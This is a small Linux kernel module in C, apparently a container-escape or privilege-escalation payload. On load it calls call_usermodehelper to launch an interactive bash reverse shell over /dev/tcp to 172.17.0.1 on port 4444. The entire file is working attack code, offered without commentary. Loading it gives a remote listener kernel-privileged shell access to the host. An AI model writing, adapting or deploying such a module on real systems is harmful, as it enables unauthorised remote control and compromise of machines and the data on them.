#include <linux/kmod.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

static char command[50] = "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1";

char* argv[] = {"/bin/bash","-c", command, NULL};
static char* envp[] = {"HOME=/",NULL};

static int __init connect_back_init(void) {

return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

}

static void __exit connect_back_exit(void){
printk(KERN_INFO "Exiting\n");
}

module_init(connect_back_init);
module_exit(connect_back_exit);
